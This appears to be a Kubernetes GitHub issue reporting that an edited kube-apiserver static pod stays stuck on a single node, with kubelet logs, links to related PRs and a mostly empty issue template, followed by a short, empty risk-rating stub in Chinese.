1. when update static pod（kube-apiserver）yaml, the static pod maybe stuck for 20 minutes to 2 hours, some logs show as follow
```
Aug 15 20:18:20 node1 hyperkube[1974327]: I0815 20:18:20.604518 1974327 actual_state_of_world.go:973] "Pod mounted volumes" uniquePodName=9d45620a-ae62-4ee3-bdb7-139998904a99 mountedVolume=[{MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-positions InnerVolumeSpecName:positions OuterVolumeSpecName:positions PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc006092940 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7a70 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/projected/9d45620a-ae62-4ee3-bdb7-139998904a99-kube-api-access-wd5vj InnerVolumeSpecName:kube-api-access-wd5vj OuterVolumeSpecName:kube-api-access-wd5vj PluginName:kubernetes.io/projected PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005345100 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b48 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-test-apiserver InnerVolumeSpecName:var-log-test-apiserver OuterVolumeSpecName:var-log-test-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc003817600 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ab8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-kube-apiserver InnerVolumeSpecName:var-log-kube-apiserver OuterVolumeSpecName:var-log-kube-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005f320c0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ae8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-oauth-apiserver InnerVolumeSpecName:var-log-oauth-apiserver OuterVolumeSpecName:var-log-oauth-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc00ae8edc0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b18 DeviceMountPath: SELinuxMountContext:}}]
Aug 15 20:18:29 node1 hyperkube[1974327]: I0815 20:18:29.606947 1974327 file.go:202] "Reading config file" path="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:18:29 node1 hyperkube[1974327]: I0815 20:18:29.607559 1974327 common.go:69] "Generated UID" pod="test-kube-apiserver/kube-apiserver" podUID=d6c287e864be7616ad8256abb9e925b1 source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:18:29 node1 hyperkube[1974327]: I0815 20:18:29.607570 1974327 common.go:73] "Generated pod name" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1 source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:18:29 node1 hyperkube[1974327]: I0815 20:18:29.607581 1974327 common.go:78] "Set namespace for pod" pod="test-kube-apiserver/kube-apiserver-node1" source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.381574 1974327 volume_manager.go:469] "Some volumes still mounted for pod" pod="test-kube-apiserver/kube-apiserver-node1" mountedVolumes=[audit-dir cert-dir resource-dir]
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.381589 1974327 kubelet.go:1976] "SyncTerminatedPod exit" pod="test-kube-apiserver/kube-apiserver-node1" podUID=bb8823c6e574ba7c1215633f4bf0f7d7
Aug 15 20:18:31 node1 hyperkube[1974327]: E0815 20:18:31.381600 1974327 pod_workers.go:1256] "Error syncing pod, skipping" err="mounted volumes=[audit-dir cert-dir resource-dir]: timed out waiting for the condition" pod="test-kube-apiserver/kube-apiserver-node1" podUID=bb8823c6e574ba7c1215633f4bf0f7d7
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.381628 1974327 pod_workers.go:1293] "Processing pod event done" pod="test-kube-apiserver/kube-apiserver-node1" podUID=bb8823c6e574ba7c1215633f4bf0f7d7 updateType="terminated"
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.381641 1974327 pod_workers.go:1188] "Processing pod event" pod="test-kube-apiserver/kube-apiserver-node1" podUID=bb8823c6e574ba7c1215633f4bf0f7d7 updateType="terminated"
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.508902 1974327 kubelet.go:2261] "SyncLoop (SYNC) pods" total=5 pods=[test-kube-apiserver/kube-apiserver-node1 test-doko/doko-ingress-proxy-tp5d5 test-cnv/hci-compute-fileserver-5874bc85df-gpph2 test-vnet-operator/vnet-operator-controller-manager-6cdcbdb49-bcrkq test-cluster-node-tuning-operator/cluster-node-tuning-operator-5bbb5fd999-r9nkg]
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.508930 1974327 pod_workers.go:931] "Notifying pod of pending update" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1 workType="sync"
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.509044 1974327 pod_workers.go:1138] "Pod cannot start yet" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.517993 1974327 kubelet.go:1965] "SyncTerminatedPod enter" pod="test-kube-apiserver/kube-apiserver-node1" podUID=bb8823c6e574ba7c1215633f4bf0f7d7
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.518002 1974327 kubelet_pods.go:1605] "Generating pod status" pod="test-kube-apiserver/kube-apiserver-node1"
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.518048 1974327 kubelet_pods.go:1615] "Got phase for pod" pod="test-kube-apiserver/kube-apiserver-node1" oldPhase=Pending phase=Pending
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.518100 1974327 status_manager.go:532] "updateStatusInternal" version=1 pod="test-kube-apiserver/kube-apiserver-node1" podUID=bb8823c6e574ba7c1215633f4bf0f7d7 containers="(kube-apiserver state=waiting previous=<none>) (kube-apiserver-cert-regeneration-controller state=waiting previous=<none>) (kube-apiserver-cert-syncer state=waiting previous=<none>) (kube-apiserver-check-endpoints state=waiting previous=<none>) (kube-apiserver-insecure-readyz state=waiting previous=<none>) (setup state=waiting previous=<none>)"
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.518170 1974327 status_manager.go:552] "Status Manager: adding pod with new status to podStatusChannel" pod="test-kube-apiserver/kube-apiserver-node1" podUID=bb8823c6e574ba7c1215633f4bf0f7d7 statusVersion=1 status={Phase:Pending Conditions:[{Type:Initialized Status:False LastProbeTime:0001-01-01 00:00:00 +0000 UTC LastTransitionTime:2024-08-15 20:18:31 +0800 CST Reason:ContainersNotInitialized Message:containers with incomplete status: [setup]} {Type:Ready Status:False LastProbeTime:0001-01-01 00:00:00 +0000 UTC LastTransitionTime:2024-08-15 20:18:31 +0800 CST Reason:ContainersNotReady Message:containers with unready status: [kube-apiserver kube-apiserver-cert-syncer kube-apiserver-cert-regeneration-controller kube-apiserver-insecure-readyz kube-apiserver-check-endpoints]} {Type:ContainersReady Status:False LastProbeTime:0001-01-01 00:00:00 +0000 UTC LastTransitionTime:2024-08-15 20:18:31 +0800 CST Reason:ContainersNotReady Message:containers with unready status: [kube-apiserver kube-apiserver-cert-syncer kube-apiserver-cert-regeneration-controller kube-apiserver-insecure-readyz kube-apiserver-check-endpoints]} {Type:PodScheduled Status:True LastProbeTime:0001-01-01 00:00:00 +0000 UTC LastTransitionTime:2024-08-15 19:57:00 +0800 CST Reason: Message:}] Message: Reason: NominatedNodeName: HostIP:10.253.166.72 PodIP:10.253.166.72 PodIPs:[{IP:10.253.166.72}] StartTime:2024-08-15 19:57:00 +0800 CST InitContainerStatuses:[{Name:setup State:{Waiting:&ContainerStateWaiting{Reason:PodInitializing,Message:,} Running:nil Terminated:nil} LastTerminationState:{Waiting:nil Running:nil Terminated:nil} Ready:false RestartCount:0 Image:image.test.io/test-ceaedge/ceaedge@sha256:b161fe4e21adfa95e7620c778536dd656a9437482d89fa44941f05c0e101fe28 ImageID: ContainerID: Started:<nil>}] ContainerStatuses:[{Name:kube-apiserver State:{Waiting:&ContainerStateWaiting{Reason:PodInitializing,Message:,} Running:nil Terminated:nil} LastTerminationState:{Waiting:nil Running:nil Terminated:nil} Ready:false RestartCount:0 Image:image.test.io/test-ceaedge/ceaedge@sha256:b161fe4e21adfa95e7620c778536dd656a9437482d89fa44941f05c0e101fe28 ImageID: ContainerID: Started:0xc011eba16d} {Name:kube-apiserver-cert-regeneration-controller State:{Waiting:&ContainerStateWaiting{Reason:PodInitializing,Message:,} Running:nil Terminated:nil} LastTerminationState:{Waiting:nil Running:nil Terminated:nil} Ready:false RestartCount:0 Image:image.test.io/test-ceaedge/ceaedge@sha256:382da2faa65c152f4d930f42f6d729fe219d337b243584f8ae13788829730024 ImageID: ContainerID: Started:0xc011eba16e} {Name:kube-apiserver-cert-syncer State:{Waiting:&ContainerStateWaiting{Reason:PodInitializing,Message:,} Running:nil Terminated:nil} LastTerminationState:{Waiting:nil Running:nil Terminated:nil} Ready:false RestartCount:0 Image:image.test.io/test-ceaedge/ceaedge@sha256:382da2faa65c152f4d930f42f6d729fe219d337b243584f8ae13788829730024 ImageID: ContainerID: Started:0xc011eba16f} {Name:kube-apiserver-check-endpoints State:{Waiting:&ContainerStateWaiting{Reason:PodInitializing,Message:,} Running:nil Terminated:nil} LastTerminationState:{Waiting:nil Running:nil Terminated:nil} Ready:false RestartCount:0 Image:image.test.io/test-ceaedge/ceaedge@sha256:382da2faa65c152f4d930f42f6d729fe219d337b243584f8ae13788829730024 ImageID: ContainerID: Started:0xc011eba1a0} {Name:kube-apiserver-insecure-readyz State:{Waiting:&ContainerStateWaiting{Reason:PodInitializing,Message:,} Running:nil Terminated:nil} LastTerminationState:{Waiting:nil Running:nil Terminated:nil} Ready:false RestartCount:0 Image:image.test.io/test-ceaedge/ceaedge@sha256:382da2faa65c152f4d930f42f6d729fe219d337b243584f8ae13788829730024 ImageID: ContainerID: Started:0xc011eba1a1}] QOSClass:Burstable EphemeralContainerStatuses:[]}
Aug 15 20:18:31 node1 hyperkube[1974327]: I0815 20:18:31.518183 1974327 volume_manager.go:448] "Waiting for volumes to unmount for pod" pod="test-kube-apiserver/kube-apiserver-node1"
Aug 15 20:18:35 node1 hyperkube[1974327]: I0815 20:18:35.509137 1974327 actual_state_of_world.go:973] "Pod mounted volumes" uniquePodName=9d45620a-ae62-4ee3-bdb7-139998904a99 mountedVolume=[{MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-positions InnerVolumeSpecName:positions OuterVolumeSpecName:positions PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc006092940 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7a70 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/projected/9d45620a-ae62-4ee3-bdb7-139998904a99-kube-api-access-wd5vj InnerVolumeSpecName:kube-api-access-wd5vj OuterVolumeSpecName:kube-api-access-wd5vj PluginName:kubernetes.io/projected PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005345100 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b48 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-test-apiserver InnerVolumeSpecName:var-log-test-apiserver OuterVolumeSpecName:var-log-test-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc003817600 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ab8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-kube-apiserver InnerVolumeSpecName:var-log-kube-apiserver OuterVolumeSpecName:var-log-kube-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005f320c0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ae8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-oauth-apiserver InnerVolumeSpecName:var-log-oauth-apiserver OuterVolumeSpecName:var-log-oauth-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc00ae8edc0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b18 DeviceMountPath: SELinuxMountContext:}}]

Aug 15 20:18:35 node1 hyperkube[1974327]: I0815 20:18:35.509810 1974327 actual_state_of_world.go:973] "Pod mounted volumes" uniquePodName=9d45620a-ae62-4ee3-bdb7-139998904a99 mountedVolume=[{MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-test-apiserver InnerVolumeSpecName:var-log-test-apiserver OuterVolumeSpecName:var-log-test-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc003817600 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ab8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-kube-apiserver InnerVolumeSpecName:var-log-kube-apiserver OuterVolumeSpecName:var-log-kube-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005f320c0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ae8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-oauth-apiserver InnerVolumeSpecName:var-log-oauth-apiserver OuterVolumeSpecName:var-log-oauth-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc00ae8edc0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b18 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-positions InnerVolumeSpecName:positions OuterVolumeSpecName:positions PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc006092940 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7a70 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/projected/9d45620a-ae62-4ee3-bdb7-139998904a99-kube-api-access-wd5vj InnerVolumeSpecName:kube-api-access-wd5vj OuterVolumeSpecName:kube-api-access-wd5vj PluginName:kubernetes.io/projected PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005345100 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b48 DeviceMountPath: SELinuxMountContext:}}]
Aug 15 20:18:46 node1 hyperkube[1974327]: I0815 20:18:46.508306 1974327 kubelet.go:2261] "SyncLoop (SYNC) pods" total=5 pods=[test-cnv/vic-image-registry-5c64975fdd-jww6l test-cnv/yum-repo-87d95477-4jfn7 test-kube-apiserver/kube-apiserver-node1 default/grafana-6598f98dd-hkzmf test-cluster-node-tuning-operator/cluster-node-tuning-operator-5bbb5fd999-r9nkg]
Aug 15 20:18:46 node1 hyperkube[1974327]: I0815 20:18:46.508354 1974327 pod_workers.go:931] "Notifying pod of pending update" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1 workType="sync"
Aug 15 20:18:46 node1 hyperkube[1974327]: I0815 20:18:46.508440 1974327 pod_workers.go:1138] "Pod cannot start yet" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1
Aug 15 20:18:49 node1 hyperkube[1974327]: I0815 20:18:49.607098 1974327 file.go:202] "Reading config file" path="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:18:49 node1 hyperkube[1974327]: I0815 20:18:49.607697 1974327 common.go:69] "Generated UID" pod="test-kube-apiserver/kube-apiserver" podUID=d6c287e864be7616ad8256abb9e925b1 source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:18:49 node1 hyperkube[1974327]: I0815 20:18:49.607708 1974327 common.go:73] "Generated pod name" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1 source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"

Aug 15 20:18:49 node1 hyperkube[1974327]: I0815 20:18:49.607717 1974327 common.go:78] "Set namespace for pod" pod="test-kube-apiserver/kube-apiserver-node1" source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:19:01 node1 hyperkube[1974327]: I0815 20:19:01.508509 1974327 kubelet.go:2261] "SyncLoop (SYNC) pods" total=7 pods=[test-controller-manager/vm-scheduler-848d87568f-xtdw7 test-kube-controller-manager/kube-controller-manager-node1 test-doko/doko-agent-6hkd8 default/hp-volume-kpbnp test-kube-apiserver/kube-apiserver-node1 test-logging/logging-operator-548564d9d9-rcncd test-monitoring/alertmanager-main-0]
Aug 15 20:19:01 node1 hyperkube[1974327]: I0815 20:19:01.508578 1974327 pod_workers.go:931] "Notifying pod of pending update" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1 workType="sync"
Aug 15 20:19:01 node1 hyperkube[1974327]: I0815 20:19:01.508643 1974327 pod_workers.go:1138] "Pod cannot start yet" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1
Aug 15 20:19:09 node1 hyperkube[1974327]: I0815 20:19:09.607309 1974327 file.go:202] "Reading config file" path="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:19:09 node1 hyperkube[1974327]: I0815 20:19:09.607920 1974327 common.go:69] "Generated UID" pod="test-kube-apiserver/kube-apiserver" podUID=d6c287e864be7616ad8256abb9e925b1 source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:19:09 node1 hyperkube[1974327]: I0815 20:19:09.607932 1974327 common.go:73] "Generated pod name" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1 source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:19:09 node1 hyperkube[1974327]: I0815 20:19:09.607944 1974327 common.go:78] "Set namespace for pod" pod="test-kube-apiserver/kube-apiserver-node1" source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:19:12 node1 hyperkube[1974327]: I0815 20:19:12.508790 1974327 kubelet.go:2261] "SyncLoop (SYNC) pods" total=2 pods=[test-kube-apiserver/kube-apiserver-node1 test-vnet-operator/vnet-operator-controller-manager-6cdcbdb49-bcrkq]
Aug 15 20:19:12 node1 hyperkube[1974327]: I0815 20:19:12.508808 1974327 pod_workers.go:931] "Notifying pod of pending update" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1 workType="sync"
Aug 15 20:19:12 node1 hyperkube[1974327]: I0815 20:19:12.508896 1974327 pod_workers.go:1138] "Pod cannot start yet" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1


Aug 15 20:19:27 node1 hyperkube[1974327]: I0815 20:19:27.508926 1974327 kubelet.go:2261] "SyncLoop (SYNC) pods" total=6 pods=[test-cnv/hci-compute-fileserver-5874bc85df-gpph2 test-vnet-operator/vnet-operator-controller-manager-6cdcbdb49-bcrkq test-base-image-registry-operator/base-image-registry-69ff9bd484-64527 test-node-label-operator/node-label-operator-6cd767b464-q4dz6 test-kube-controller-manager/kube-controller-manager-node1 test-kube-apiserver/kube-apiserver-node1]
Aug 15 20:19:27 node1 hyperkube[1974327]: I0815 20:19:27.509009 1974327 pod_workers.go:931] "Notifying pod of pending update" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1 workType="sync"
Aug 15 20:19:27 node1 hyperkube[1974327]: I0815 20:19:27.509099 1974327 pod_workers.go:1138] "Pod cannot start yet" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1
Aug 15 20:19:29 node1 hyperkube[1974327]: I0815 20:19:29.607409 1974327 file.go:202] "Reading config file" path="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:19:29 node1 hyperkube[1974327]: I0815 20:19:29.607998 1974327 common.go:69] "Generated UID" pod="test-kube-apiserver/kube-apiserver" podUID=d6c287e864be7616ad8256abb9e925b1 source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:19:29 node1 hyperkube[1974327]: I0815 20:19:29.608009 1974327 common.go:73] "Generated pod name" pod="test-kube-apiserver/kube-apiserver-node1" podUID=d6c287e864be7616ad8256abb9e925b1 source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:19:29 node1 hyperkube[1974327]: I0815 20:19:29.608017 1974327 common.go:78] "Set namespace for pod" pod="test-kube-apiserver/kube-apiserver-node1" source="/etc/kubernetes/manifests/kube-apiserver-pod.yaml"
Aug 15 20:19:40 node1 hyperkube[1974327]: I0815 20:19:40.511401 1974327 actual_state_of_world.go:973] "Pod mounted volumes" uniquePodName=9d45620a-ae62-4ee3-bdb7-139998904a99 mountedVolume=[{MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-test-apiserver InnerVolumeSpecName:var-log-test-apiserver OuterVolumeSpecName:var-log-test-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc003817600 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ab8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-kube-apiserver InnerVolumeSpecName:var-log-kube-apiserver OuterVolumeSpecName:var-log-kube-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005f320c0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ae8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-oauth-apiserver InnerVolumeSpecName:var-log-oauth-apiserver OuterVolumeSpecName:var-log-oauth-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc00ae8edc0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b18 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-positions InnerVolumeSpecName:positions OuterVolumeSpecName:positions PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc006092940 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7a70 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/projected/9d45620a-ae62-4ee3-bdb7-139998904a99-kube-api-access-wd5vj InnerVolumeSpecName:kube-api-access-wd5vj OuterVolumeSpecName:kube-api-access-wd5vj PluginName:kubernetes.io/projected PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005345100 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b48 DeviceMountPath: SELinuxMountContext:}}]
Aug 15 20:19:40 node1 hyperkube[1974327]: I0815 20:19:40.512098 1974327 actual_state_of_world.go:973] "Pod mounted volumes" uniquePodName=9d45620a-ae62-4ee3-bdb7-139998904a99 mountedVolume=[{MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-test-apiserver InnerVolumeSpecName:var-log-test-apiserver OuterVolumeSpecName:var-log-test-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc003817600 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ab8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-kube-apiserver InnerVolumeSpecName:var-log-kube-apiserver OuterVolumeSpecName:var-log-kube-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005f320c0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7ae8 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-var-log-oauth-apiserver InnerVolumeSpecName:var-log-oauth-apiserver OuterVolumeSpecName:var-log-oauth-apiserver PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc00ae8edc0 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b18 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/host-path/9d45620a-ae62-4ee3-bdb7-139998904a99-positions InnerVolumeSpecName:positions OuterVolumeSpecName:positions PluginName:kubernetes.io/host-path PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc006092940 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7a70 DeviceMountPath: SELinuxMountContext:}} {MountedVolume:{PodName:9d45620a-ae62-4ee3-bdb7-139998904a99 VolumeName:kubernetes.io/projected/9d45620a-ae62-4ee3-bdb7-139998904a99-kube-api-access-wd5vj InnerVolumeSpecName:kube-api-access-wd5vj OuterVolumeSpecName:kube-api-access-wd5vj PluginName:kubernetes.io/projected PodUID:9d45620a-ae62-4ee3-bdb7-139998904a99 Mounter:0xc005345100 BlockVolumeMapper:<nil> VolumeGidValue: VolumeSpec:0xc0032f7b48 DeviceMountPath: SELinuxMountContext:}}]
```
2. restart kubelet will start the static pod quickly

3. related PR:
- https://github.com/kubernetes/kubernetes/pull/113145
- https://github.com/kubernetes/kubernetes/issues/117745
- https://github.com/kubernetes/kubernetes/pull/117751
- https://github.com/kubernetes/kubernetes/pull/116995

#### What did you expect to happen?

The static pods will start soon when edit the static pod yaml

#### How can we reproduce it (as minimally and precisely as possible)?

this happend by chance , now can be reproduced in K8s  1.25 and 1.29  on single node

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version

# paste output here
```
k8s 1.25
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
**漏洞分析：**

